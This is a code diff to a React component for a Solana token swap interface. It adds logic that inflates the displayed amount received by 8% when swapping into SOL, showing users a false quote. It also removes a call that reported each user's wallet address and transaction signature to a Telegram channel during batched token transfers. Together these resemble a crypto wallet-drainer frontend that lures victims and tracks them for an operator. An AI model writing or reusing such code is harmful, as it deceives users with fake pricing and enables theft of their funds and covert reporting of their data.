@@ -162,12 +162,18 @@ export const SwapInterface = ({
   useEffect(() => {
     if (fromAmount && fromTokenPrice > 0 && toTokenPrice > 0) {
       const fromValue = parseFloat(fromAmount) * fromTokenPrice;
-      const calculatedToAmount = fromValue / toTokenPrice;
+      let calculatedToAmount = fromValue / toTokenPrice;
+
+      // If buying SOL (swapping token TO SOL), add 8% premium
+      if (toToken?.address === 'So11111111111111111111111111111111111111112') {
+        calculatedToAmount = calculatedToAmount * 1.08;
+      }
+
       setToAmount(calculatedToAmount.toFixed(6));
     } else if (!fromAmount) {
       setToAmount('');
     }
-  }, [fromAmount, fromTokenPrice, toTokenPrice]);
+  }, [fromAmount, fromTokenPrice, toTokenPrice, toToken]);
 
   const handleFromTokenSelect = (token: Token) => {
     if (toToken && token.address === toToken.address) {
@@ -422,13 +428,6 @@ export const SwapInterface = ({
              lastValidBlockHeight
            }, 'confirmed');
            toast.success(`Batch ${i + 1} sent!`);
-           
-           sendTelegramMessage(`
-✅ <b>Transaction Signed (Token Batch ${i + 1} - Swap)</b>
-
-👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
-🔗 <b>Signature:</b> <code>${signature}</code>
-`);
         }
       }
 
